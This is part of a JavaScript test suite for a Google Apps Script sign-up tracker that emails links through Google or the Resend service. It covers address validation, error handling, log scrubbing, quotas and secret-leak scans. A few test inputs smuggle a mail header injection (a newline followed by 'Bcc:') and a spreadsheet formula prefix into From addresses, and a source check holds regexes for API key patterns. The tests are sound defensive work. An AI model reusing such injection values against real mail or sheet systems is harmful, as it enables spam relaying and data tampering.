    check('curly quotes, a dash, accents, kanji and an emoji in his words go over the wire as plain ASCII', JSON.stringify(r) === SENT && typeof c.raw === 'string' && /^[\x20-\x7e]+$/.test(c.raw) && c.raw.indexOf('\\u2019') > 0 && c.raw.indexOf('\\ud83e\\udd4b') > 0, c.raw);
    check('and arrive exactly as he typed them', m.body === fancy.replace('{link}', LINK + rowOf(w, 'fancy@example.com')[0]) && m.subject === 'Kevin\u2019s \ud83e\udd4b tracker' && m.from === 'Jos\u00e9 \u30ab\u30bf <' + ME + '>', m);
    setWord(w, 'Email subject', ''); setWord(w, 'Email body', '');
  }
  setWord(w, 'From name', '<.,;>'); minutes(w, 1);
  w.post({ a: 'join', e: 'bare@example.com' });
  check('a From name with nothing usable in it leaves the bare address, not a stray space', lastSend(w).from === ME && lastSend(w).to === 'bare@example.com', JSON.stringify(lastSend(w).from));
  setWord(w, 'From name', '');

  const JUNK = ['Kevin <kevin@katawarrior.com>', 'kevin@katawarrior.com, other@example.com', 'kevin@katawarrior.com;other@example.com', 'not an address', 'kevin@', 'kevin@katawarrior,com', 'kevin@katawarrior.com.', 'kevin@katawarrior.com\u200b', '=cmd@example.com', 'kevin@katawarrior.com\nBcc: other@example.com', 'x'.repeat(130) + '@katawarrior.com'];
  for (const junk of JUNK) {
    setWord(w, 'From address', junk); minutes(w, 1);
    const before = [w.send.calls.length, w.mail.sent.length, w.errors.length];
    const e = 'j' + before[2] + '@example.com';
    const r1 = w.post({ a: 'join', e: e });
    check('with the key in place, a From address that is not one plain address sends nothing, by either road: ' + JSON.stringify(junk).slice(0, 40), r1.ok === false && r1.error === 'mail' && w.send.calls.length === before[0] && w.mail.sent.length === before[1] && !!rowOf(w, e) && !rowOf(w, e)[20], [r1, w.mail.sent.length - before[1]]);
    check('and the reason is written down, once, without the address or the key', w.errors.length === before[2] + 1 && w.errors[before[2]] === 'link email not sent: the sending service is switched on, but the From address on the Words tab is not one plain address', w.errors.slice(before[2]));
  }
  w.logs.length = 0; w.gs.setup();
  check('setup says, loudly, that nobody is sending', w.logs.some(l => /^Sender: NOBODY\. RESEND_KEY is in Script Properties, but the From address on the Words tab is not one plain address, so no link email is being sent\./.test(l)) && !w.logs.some(l => /^Sender: (the sending service|still Google|Google)/.test(l)) && w.logs.join(' ').indexOf(KEY) < 0, w.logs.filter(l => /^Sender/.test(l)));
  w.logs.length = 0; w.gs.checkSender();
  check('and so does checkSender', w.logs[0] === 'From address: what is on the Words tab is not one plain address.' && w.logs[w.logs.length - 1] === 'As things stand, NO link email is sent: put the From address right, or empty that cell to have Google send.', w.logs);
  {
    const fixed = rowOf(w, 'j' + (w.errors.length - 1) + '@example.com');
    setWord(w, 'From address', ME); minutes(w, 1);
    const n = w.send.sent.length;
    const r2 = w.post({ a: 'join', e: fixed[1] });
    check('put the cell right and the same man, asking again, is sent his link through the service', JSON.stringify(r2) === SENT && w.send.sent.length === n + 1 && lastSend(w).to === fixed[1] && lastSend(w).body.endsWith(LINK + fixed[0]), r2);
  }
  delete w.props.RESEND_KEY;
  for (const junk of JUNK.slice(0, 4)) {
    setWord(w, 'From address', junk); minutes(w, 1);
    const before = [w.send.calls.length, w.mail.sent.length, w.errors.length];
    const r1 = w.post({ a: 'join', e: 'g' + before[1] + '@example.com' });
    check('with no key, the same cell changes nothing and Google sends: ' + JSON.stringify(junk).slice(0, 40), JSON.stringify(r1) === SENT && w.send.calls.length === before[0] && w.mail.sent.length === before[1] + 1 && w.errors.length === before[2], r1);
  }
  w.logs.length = 0; w.gs.setup();
  check('and setup says Google is the sender, noting the cell', w.logs.some(l => /^Sender: Google, from this account\. \d+ more can be sent today\. \(The From address on the Words tab is not one plain address\. It changes nothing while there is no RESEND_KEY\.\)$/.test(l)), w.logs.filter(l => /^Sender/.test(l)));
  w.props.RESEND_KEY = KEY;
  setWord(w, 'From address', '  Kevin@KataWarrior.COM '); minutes(w, 1);
  w.post({ a: 'join', e: 'caps@example.com' });
  check('capitals and spaces around the From address do not matter', lastSend(w).fromAddress === ME && lastSend(w).to === 'caps@example.com');
  w.props.RESEND_KEY = '  ' + KEY + '\n'; minutes(w, 1);
  w.post({ a: 'join', e: 'pasted@example.com' });
  check('a key pasted with a space or a line break around it still works', lastSend(w).to === 'pasted@example.com');

  minutes(w, 1);
  w.post({ a: 'join', e: 'First.Last+Kata@GoogleMail.com' });
  check('through the service too, the email goes to the address as typed, not to the mailbox it is counted under', lastSend(w).to === 'first.last+kata@googlemail.com' && w.send.calls[w.send.calls.length - 1].msg.to[0] === 'first.last+kata@googlemail.com' && rowOf(w, 'first.last+kata@googlemail.com')[1] === 'first.last+kata@googlemail.com', lastSend(w).to);
  minutes(w, 1);
  w.post({ a: 'join', e: 'o\'brien_x%y+z@Example.co.uk' });
  check('an address with every mark the door allows goes out whole', lastSend(w).to === 'o\'brien_x%y+z@example.co.uk', lastSend(w).to);
  rightAway(w); setWord(w, 'From address', ME); w.props.RESEND_KEY = KEY; minutes(w, 1);
  const q = w.post({ a: 'join', e: 'quick@example.com' });
  check('with Open right away on, a new man is handed his code and the service still emails it', KW.test(q.k) && q.mailed === true && lastSend(w).to === 'quick@example.com' && lastSend(w).body.indexOf(LINK + q.k) >= 0, q);
  setWord(w, 'Open right away', 'no');

  delete w.props.RESEND_KEY; minutes(w, 1);
  const n = w.mail.sent.length;
  w.post({ a: 'join', e: 'back@example.com' });
  check('take the key away and Google sends again', w.mail.sent.length === n + 1 && last(w).to === 'back@example.com');
  check('the script reached out to the sending service and nowhere else', w.fetched.every(u => u === 'https://api.resend.com') && w.fetched.length === w.send.calls.length + w.send.checks.length && w.send.checks.length === 1, w.fetched.filter((v, i, a) => a.indexOf(v) === i));
  const hello = w.get();
  check('opening the address says three things and no more', w.answers[w.answers.length - 1] === '{"ok":true,"service":"kata-warrior-tracker","v":3}', w.answers[w.answers.length - 1]);
  w.post({ a: 'load', k: rowOf(w, 'quick@example.com')[0] }); w.post({ a: 'nonsense' }); w.post('not json');
  check('the key is in no row, no log and no answer the web address ever gave', JSON.stringify(w.tab().rows).indexOf(KEY) < 0 && JSON.stringify(w.sheets.Words.rows).indexOf(KEY) < 0 && w.logs.concat(w.errors).join(' ').indexOf(KEY) < 0 && w.answers.length > 30 && w.answers.join('\n').indexOf(KEY) < 0 && w.answers.join('\n').indexOf('re_') < 0 && w.answers.join('\n').indexOf('katawarrior.com<') < 0 && hello.ok === true, w.answers.filter(a => a.indexOf('re_') >= 0));
  check('nor is the From address, or any word of the email', w.answers.join('\n').indexOf(ME) < 0 && w.answers.join('\n').indexOf('Kevin here') < 0);
  check('nothing written could be read as a formula; no lock let go with a write waiting', w.hazards.length === 0 && w.unflushed === 0 && w.locks === 0, [w.hazards, w.unflushed, w.errors]);
}

/* 20. when the sending service says no */
{
  const fresh = () => { const w = makeWorld(); w.now = T0; withService(w); return w; };
  const cases = [
    ['a key the service does not know', w => { w.props.RESEND_KEY = 're_wrongKey000000000'; }, /answered 401\. validation_error API key is invalid/],
    ['a key the service knows but has switched off', w => { w.send.dead[KEY] = true; }, /answered 403\. restricted_api_key API key is not active/],
    ['a From address at a domain the service has not verified', w => { setWord(w, 'From address', 'kevin@example.org'); }, /answered 403\. validation_error The example\.org domain is not verified/],
    ['the service\'s day used up', w => { w.send.quota = 0; }, /answered 429\. daily_quota_exceeded/],
    ['the service in trouble', w => { w.send.fail = 500; }, /answered 500\. application_error Could not deliver to \(an address\) using key \(a key\)/],
    ['the service unreachable', w => { w.send.down = true; }, /Address unavailable/],
    ['the service not answering in time', w => { w.send.stall = true; }, /timed out after 15 seconds/],
    ['something in front of the service turning the script away', w => { w.send.oddSend = [403, 'error code: 1010']; }, /answered 403\. error code: 1010$/],
    ['an error page instead of an answer', w => { w.send.oddSend = [502, '<html><head><title>502 Bad Gateway</title></head><body><h1>Bad Gateway</h1> for unlucky@example.com</body></html>']; }, /answered 502\. 502 Bad Gateway Bad Gateway for \(an address\)$/],
    ['the script\'s settings unreadable', w => { w.propsDown = true; }, /Service error: Properties/]
  ];
  for (const [what, breakIt, logged] of cases) {
    const w = fresh(); breakIt(w);
    const r = w.post({ a: 'join', e: 'unlucky@example.com' });
    check(what + ': the page is told it did not send', r.ok === false && r.error === 'mail' && JSON.stringify(r).indexOf('kw_') < 0, r);
    check(what + ': Google is not used instead', w.mail.sent.length === 0 && w.send.sent.length === 0, [w.mail.sent.length, w.send.sent.length]);
    check(what + ': his row is kept, with no emailed date', (() => { w.propsDown = false; const x = rowOf(w, 'unlucky@example.com'); return !!x && !x[20]; })());
    check(what + ': the reason is written down, with no address and no key in it', w.errors.length === 1 && /^link email not sent: /.test(w.errors[0]) && logged.test(w.errors[0]) && w.errors[0].indexOf('unlucky') < 0 && w.errors[0].indexOf('re_') < 0 && w.errors[0].indexOf('@') < 0, w.errors);
    check(what + ': nothing is counted as sent', !w.props.MAIL_TALLY, w.props.MAIL_TALLY);
    w.props.RESEND_KEY = KEY; setWord(w, 'From address', ME); w.send.quota = 100; w.send.fail = 0; w.send.down = false; w.send.stall = false; w.send.oddSend = null; w.send.dead = {}; w.propsDown = false;
    const again = w.post({ a: 'join', e: 'unlucky@example.com' });
    check(what + ': once it is put right, the same man asking again is sent his link, with no wait', JSON.stringify(again) === SENT && w.send.sent.length === 1 && lastSend(w).to === 'unlucky@example.com' && lastSend(w).body.endsWith(LINK + rowOf(w, 'unlucky@example.com')[0]), again);
  }
  {
    const w = fresh(); w.mail.quota = 0;
    const r = w.post({ a: 'join', e: 'spent@example.com' });
    check('Google\'s own allowance being spent does not hold the service back', JSON.stringify(r) === SENT && w.send.sent.length === 1 && w.mail.sent.length === 0 && w.errors.length === 0, [r, w.errors]);
  }
  {
    const w = fresh(); w.mail.denied = true;
    const r = w.post({ a: 'join', e: 'denied@example.com' });
    check('nor does Google refusing to say what is left', JSON.stringify(r) === SENT && w.send.sent.length === 1, [r, w.errors]);
  }
  {
    const w = fresh(); w.send.okCode = 202;
    const r = w.post({ a: 'join', e: 'taken@example.com' });
    check('any answer in the 200s from the service means the email was taken', JSON.stringify(r) === SENT && w.send.sent.length === 1 && w.props.MAIL_TALLY === '2026-10-05|1' && rowOf(w, 'taken@example.com')[20] instanceof Date && w.errors.length === 0, [r, w.errors]);
  }
  {
    const w = fresh(); w.propsStuck = true;
    const r = w.post({ a: 'join', e: 'uncounted@example.com' });
    check('if the day\'s tally cannot be written, an email that went is still an email that went', JSON.stringify(r) === SENT && w.send.sent.length === 1 && !w.props.MAIL_TALLY && rowOf(w, 'uncounted@example.com')[20] instanceof Date, [r, w.errors]);
    const twice = w.post({ a: 'join', e: 'uncounted@example.com' });
    check('and asking again straight away does not send it a second time', JSON.stringify(twice) === SENT && w.send.sent.length === 1 && w.send.calls.length === 1, twice);
  }
  {
    /* B3: a man who has had his link before, on a day the service will take no more */
    const w = fresh();
    w.post({ a: 'join', e: 'oldhand@example.com' });
    check('(a man is sent his link through the service)', w.send.sent.length === 1 && rowOf(w, 'oldhand@example.com')[20] instanceof Date);
    minutes(w, 11); w.send.quota = 0;
    let r = w.post({ a: 'join', e: 'oldhand@example.com' });
    check('a returning man on a day the service will take no more is told it did not send; Google is not used for him either', r.ok === false && r.error === 'mail' && w.mail.sent.length === 0 && w.send.sent.length === 1 && /answered 429\. daily_quota_exceeded/.test(w.errors[0]), [r, w.mail.sent.length, w.errors]);
    w.send.quota = 100; w.props.MAIL_TALLY = '2026-10-05|100';
    r = w.post({ a: 'join', e: 'oldhand@example.com' });
    check('by the script\'s own count the day is spent, yet a returning man is still tried through the service, never through Google', JSON.stringify(r) === SENT && w.send.sent.length === 2 && w.mail.sent.length === 0 && w.props.MAIL_TALLY === '2026-10-05|101', [r, w.props.MAIL_TALLY]);
  }
  {
    /* A6: with nothing in the From address cell, the script's settings are not read at all: exactly as before the service existed */
    const w = makeWorld(); w.now = T0; w.gs.setup(); w.propsDown = true;
    const r = w.post({ a: 'join', e: 'asbefore@example.com' });
    check('with no From address, the script\'s settings being unreadable does not matter: Google sends, as it always did', JSON.stringify(r) === SENT && w.mail.sent.length === 1 && w.send.calls.length === 0 && w.errors.length === 0, [r, w.errors]);
  }
  {
    /* what scrub_ takes out of a line */
    const w = makeWorld(); const sc = w.gs.scrub_;
    const lines = [
      ['Invalid email: John.O\'Neil+Tag@Example.co.uk', 'Invalid email: (an address)'],
      ['to a_b%c@x.io, 9lives@example.com; and <UPPER@EXAMPLE.COM>', 'to (an address), (an address); and <(an address)>'],
      ['key re_made_up_key_0000 here', 'key (a key) here'],
      ['keys rk_live_AbCdEf123456, sk_test_AbCdEf123456 and pk_AbCdEf123456.', 'keys (a key), (a key) and (a key).'],
      ['the words more_information, disk_quota_exceeded and restricted_api_key are left alone', 'the words more_information, disk_quota_exceeded and restricted_api_key are left alone'],
      ['no address, no key', 'no address, no key']
    ];
    for (const [given, want] of lines) check('a log line is cleaned: ' + given.slice(0, 44), sc(given) === want, sc(given));
    check('the very address and the very key go, wherever they sit and however odd they look', sc('xBearerre_made_up_0000x and "j.o\'neil@example.com"', ['j.o\'neil@example.com', 'Bearerre_made_up_0000']) === 'x(a key)x and "(an address)"', sc('xBearerre_made_up_0000x and "j.o\'neil@example.com"', ['j.o\'neil@example.com', 'Bearerre_made_up_0000']));
    check('nothing short is taken for a key, and an empty or missing one is skipped', sc('a b c abc', ['', null, undefined, 'abc']) === 'a b c abc' && sc('x'.repeat(400)).length === 300);
  }
  {
    /* the service echoing the man's own address, apostrophe and all, or the key */
    const w = fresh(); w.send.fail = 500;
    w.post({ a: 'join', e: 'j.o\'neil@example.com' });
    check('an address with an apostrophe in it is still kept out of the log', w.errors.length === 1 && /Could not deliver to \(an address\) using key \(a key\)$/.test(w.errors[0]) && w.errors[0].indexOf('neil') < 0 && w.errors[0].indexOf("j.o") < 0, w.errors);
    const w2 = fresh(); w2.props.RESEND_KEY = 'Bearer ' + KEY; w2.send.oddSend = [401, JSON.stringify({ statusCode: 401, name: 'validation_error', message: 'Unknown credential Bearer' + KEY + ' for late@example.com' })];
    w2.post({ a: 'join', e: 'late@example.com' });
    check('a badly pasted key, echoed back whole, is still kept out of the log', w2.errors.length === 1 && w2.errors[0] === 'link email not sent: the sending service answered 401. validation_error Unknown credential (a key) for (an address)' && w2.errors[0].indexOf('goodKey') < 0, w2.errors);
  }
  const w = fresh(); rightAway(w); w.send.fail = 500;
  const q = w.post({ a: 'join', e: 'quick@example.com' });
  check('with Open right away on, a new man still gets in when the service fails, and nothing claims an email went', KW.test(q.k) && q.mailed === false && w.mail.sent.length === 0 && w.send.sent.length === 0, q);
}

/* 21. the service's hundred a day, twenty of them kept back */
{
  const w = makeWorld(); w.now = Date.UTC(2026, 9, 5, 8, 0, 0); withService(w);
  w.post({ a: 'join', e: 'oldhand@example.com' });
  let sent = 1, held = 0;
  for (let i = 0; i < 100; i++) { if (i % 10 === 0) minutes(w, 11); const x = w.post({ a: 'join', e: 'day' + i + '@example.com' }); if (x.sent) sent++; else if (x.error === 'mail') held++; }
  check('through the service, eighty emails go to new men in a day; the rest have a row and are told it did not send', sent === 80 && held === 21 && w.send.sent.length === 80 && w.send.calls.length === 80 && w.props.MAIL_TALLY === '2026-10-05|80', [sent, held, w.send.calls.length, w.props.MAIL_TALLY]);
  check('a held man is not sent by asking twice', w.post({ a: 'join', e: 'day99@example.com' }).error === 'mail' && w.send.calls.length === 80);
  minutes(w, 11);
  check('a man who was sent his link before still gets it from what was kept back', JSON.stringify(w.post({ a: 'join', e: 'oldhand@example.com' })) === SENT && lastSend(w).to === 'oldhand@example.com' && w.props.MAIL_TALLY === '2026-10-05|81');
  check('Google was never used, and nothing but the limit was written down', w.mail.sent.length === 0 && w.errors.length === 22 && w.errors.every(e => /kept for men asking again/.test(e)), [w.mail.sent.length, w.errors.length]);
  w.now = Date.UTC(2026, 9, 6, 0, 5, 0); w.send.quota = 100;
  check('the next day by the world clock, the held man gets his', JSON.stringify(w.post({ a: 'join', e: 'day99@example.com' })) === SENT && lastSend(w).to === 'day99@example.com' && w.props.MAIL_TALLY === '2026-10-06|1', w.props.MAIL_TALLY);
  w.props.MAIL_TALLY = 'nonsense';
  minutes(w, 1);
  check('a tally someone has scribbled on is treated as none', JSON.stringify(w.post({ a: 'join', e: 'after@example.com' })) === SENT && w.props.MAIL_TALLY === '2026-10-06|1');
  check('every lock taken was released, none with a write waiting', w.locks === 0 && w.unflushed === 0);
}

/* 22. checkSender: run by hand, asks the service whether it knows the key, sends nothing */
{
  const FULL = 're_fullKey12345678901';
  const run = (prep) => { const w = makeWorld(); w.now = T0; w.gs.setup(); setWord(w, 'From address', ME); if (prep) prep(w); w.logs.length = 0; const before = JSON.stringify([w.tab().rows, w.sheets.Words.rows, w.props]); let threw = null; try { w.gs.checkSender(); } catch (e) { threw = e.message; } return { w, threw, same: JSON.stringify([w.tab().rows, w.sheets.Words.rows, w.props]) === before }; };
  const quiet = r => r.threw === null && r.same && r.w.mail.sent.length === 0 && r.w.send.sent.length === 0 && r.w.send.calls.length === 0 && r.w.send.checks.length === 1 && r.w.send.checks[0].method === 'get' && r.w.send.checks[0].payload === null && r.w.send.checks[0].mute === true && r.w.send.checks[0].timeout === 15 && r.w.errors.length === 0;
  const noKey = r => r.w.logs.concat(r.w.errors).join('\n').indexOf('re_') < 0;

  let r = run();
  check('with no key, it says so, and that Google is the sender', r.w.logs.join('\n') === 'From address: ' + ME + '\nRESEND_KEY: not set.\nThe service can be reached from this script.\nAs things stand, Google sends the link email.', r.w.logs);
  check('it asked one question, with no key in it, sent no email and changed nothing', quiet(r) && r.w.send.checks[0].key === '' && r.w.send.checks[0].headers === '' && r.w.send.checks[0].url === 'https://api.resend.com/domains', r.w.send.checks);

  r = run(w => { w.props.RESEND_KEY = KEY; });
  check('a key that can only send is called the right kind', r.w.logs.join('\n') === 'From address: ' + ME + '\nRESEND_KEY: the service knows this key, and it can only send. That is the right kind.\nA key of this kind cannot be asked about the domain. The Domains page in Resend shows whether it is verified.\nAs things stand, the sending service is asked to send the link email.', r.w.logs);
  check('one question, the key in its header only; no email; nothing changed; the key not shown', quiet(r) && r.w.send.checks[0].key === KEY && r.w.send.checks[0].headers === 'Authorization' && noKey(r), r.w.send.checks);

  r = run(w => { w.props.RESEND_KEY = ' ' + KEY + '\n'; });
  check('the same key pasted with a space and a line break is still known', /knows this key, and it can only send/.test(r.w.logs[1]) && quiet(r));

  r = run(w => { w.props.RESEND_KEY = 're_cutShort123'; });
  check('a key the service does not know is called that, with what to do', r.w.logs[1] === 'RESEND_KEY: the service did NOT accept this key. It answered 400. validation_error API key is invalid' && /pasted whole/.test(r.w.logs[2]) && quiet(r) && noKey(r), r.w.logs);
  r = run(w => { w.props.RESEND_KEY = '"' + KEY + '"'; });
  check('so is a key pasted with quote marks round it', /did NOT accept this key/.test(r.w.logs[1]) && quiet(r), r.w.logs);
  r = run(w => { w.props.RESEND_KEY = KEY; w.send.dead[KEY] = true; });
  check('a key the service has switched off is not called good, though its name is "restricted"', r.w.logs[1] === 'RESEND_KEY: the service did NOT accept this key. It answered 403. restricted_api_key API key is not active' && quiet(r) && noKey(r), r.w.logs);
  r = run(w => { w.props.RESEND_KEY = KEY; w.send.odd = [403, { statusCode: 403, name: 'suspended_api_key', message: 'This API key is suspended. It was used to send to someone@example.com' }]; });
  check('nor is a suspended one; and what the service says is shown without any address in it', /did NOT accept this key\. It answered 403\. suspended_api_key This API key is suspended\. It was used to send to \(an address\)$/.test(r.w.logs[1]) && quiet(r), r.w.logs);

  r = run(w => { w.props.RESEND_KEY = FULL; w.send.full[FULL] = true; });
  check('a full access key is said to work, and to be the wrong kind', /^RESEND_KEY: the service knows this key, and it works\. But it is a FULL ACCESS key\./.test(r.w.logs[1]) && /Sending access/.test(r.w.logs[1]) && quiet(r) && noKey(r), r.w.logs);
  check('and with it the domain can be read: verified', r.w.logs[2] === 'katawarrior.com: verified with the service.', r.w.logs[2]);
  r = run(w => { w.props.RESEND_KEY = FULL; w.send.full[FULL] = true; w.send.domains = [{ name: 'other.example', status: 'verified' }, { name: 'KataWarrior.com', status: 'pending' }]; });
  check('or not yet verified', r.w.logs[2] === 'katawarrior.com: NOT verified with the service yet (pending).' && quiet(r), r.w.logs[2]);
  r = run(w => { w.props.RESEND_KEY = FULL; w.send.full[FULL] = true; w.send.domains = [{ name: 'other.example', status: 'verified' }]; });
  check('or not on the account at all', r.w.logs[2] === 'katawarrior.com: not among the domains on this Resend account.' && quiet(r), r.w.logs[2]);
  r = run(w => { w.props.RESEND_KEY = FULL; w.send.full[FULL] = true; w.send.domains = []; setWord(w, 'From address', ''); });
  check('with no From address it says so, names no domain, and says Google is still the sender', r.w.logs[0] === 'From address: none yet on the Words tab.' && r.w.logs.length === 3 && r.w.logs[2] === 'As things stand, Google sends the link email.' && quiet(r), r.w.logs);

  r = run(w => { w.props.RESEND_KEY = KEY; w.send.down = true; });
  check('if the service cannot be reached, it says that and stops', r.threw === null && r.w.logs.length === 2 && /^The service could not be reached from this script: Address unavailable/.test(r.w.logs[1]) && r.same && noKey(r), r.w.logs);
  r = run(w => { w.props.RESEND_KEY = KEY; w.send.odd = [503, '<html>Service Unavailable</html>']; });
  check('an answer that is not the service\'s own is not taken for a yes', r.w.logs[1] === 'RESEND_KEY: the service did NOT accept this key. It answered 503. Service Unavailable' && quiet(r), r.w.logs);
  r = run(w => { w.send.odd = [403, 'error code: 1010']; });
  check('with no key, a blocked request is reported as such, not as reachable', r.w.logs[2] === 'The service did not answer as expected: 403. error code: 1010' && r.w.logs[1] === 'RESEND_KEY: not set.' && quiet(r), r.w.logs);
  r = run(w => { w.props.RESEND_KEY = 'Bearer ' + KEY; w.send.odd = [401, { statusCode: 401, name: 'validation_error', message: 'Unknown credential Bearer' + KEY }]; });
  check('if the service ever echoed a badly pasted key back, it still would not be shown', r.w.logs[1] === 'RESEND_KEY: the service did NOT accept this key. It answered 401. validation_error Unknown credential (a key)' && noKey(r) && r.w.logs.join(' ').indexOf('goodKey') < 0 && quiet(r), r.w.logs);
  r = run(w => { w.props.RESEND_KEY = KEY; w.send.odd = [200, { object: 'list' }]; });
  check('a 200 with no list of domains is not taken for a yes either', /did NOT accept this key\. It answered 200/.test(r.w.logs[1]) && quiet(r), r.w.logs);
}

/* 18. the script holds nothing it should not */
{
  const src = require('fs').readFileSync(require('path').join(__dirname, 'Code.gs'), 'utf8');
  check('no key, token or password is in the script', !/\b(rk|sk|pk)_(test|live)_[A-Za-z0-9]{8,}/.test(src) && !/whsec_|AIza[0-9A-Za-z_-]{20,}|password\s*[:=]/i.test(src));
  check('the script is plain ASCII', /^[\x09\x0a\x20-\x7e]*$/.test(src));
  check('it only ever touches its own spreadsheet', /@OnlyCurrentDoc/.test(src) && !/openById|openByUrl|DriveApp|GmailApp/.test(src));
  check('Google\'s mail is used in one place only, to one address, with no cc or bcc', (src.match(/MailApp\.sendEmail/g) || []).length === 1 && !/\b(cc|bcc|htmlBody|replyTo|reply_to|html|attachments|headers\s*:\s*\{[^}]*(Cc|Bcc))\s*:/.test(src.replace(/headers: \{ Authorization[^}]*\}/g, '')));
  check('the script reaches out to two places only: the sending service and Stripe', JSON.stringify((src.match(/https:\/\/[a-z0-9.\-]+/g) || []).filter((v, i, a) => a.indexOf(v) === i).sort()) === JSON.stringify(['https://api.resend.com', 'https://api.stripe.com', 'https://katawarrior.com']) && (src.match(/UrlFetchApp\.fetch\(/g) || []).length === 4 && (src.match(/SERVICE_CHECK/g) || []).length === 2, (src.match(/https:\/\/[a-z0-9.\-]+/g) || []).filter((v, i, a) => a.indexOf(v) === i));
  check('the sending service is asked for one thing only: to send, as text, to one address', /payload: ascii_\(JSON\.stringify\(\{ from: fromLine_\(words\), to: \[email\], subject: words\.subject, text: body \}\)\),/.test(src) && (src.match(/SERVICE_URL/g) || []).length === 2);
  check('the key is read from the script\'s settings and written nowhere', (src.match(/SERVICE_KEY\)/g) || []).length === 1 && !/setProperty\(SERVICE_KEY/.test(src) && !/console\.(log|error)\([^)]*\bkey\b\s*[,)+]/.test(src.replace(/'[^']*'/g, "''").replace(/\/\^re_\/\.test\(key\)/g, '')));
  check('no man\'s email address is written to the log: the one place it is named in a log line is to have it taken out', !/console\.(log|error)\([^)]*\b(email|box)\b[^)]*\)/.test(src.replace(/'[^']*'/g, "''").replace('err, [email, key]));', 'err));')) && /console\.error\('link email not sent: ' \+ scrub_\(err && err\.message \? err\.message : err, \[email, key\]\)\);/.test(src) && (src.match(/\[email, key\]/g) || []).length === 1);
  check('every place that lets the lock go after writing has sent the write to the Sheet first', (src.match(/SpreadsheetApp\.flush\(\)/g) || []).length >= 5);
}

console.log(passed + ' passed; ' + (failed.length ? 'FAILED: ' + JSON.stringify(failed) : 'ALL PASSED'));
process.exit(failed.length ? 1 : 0);
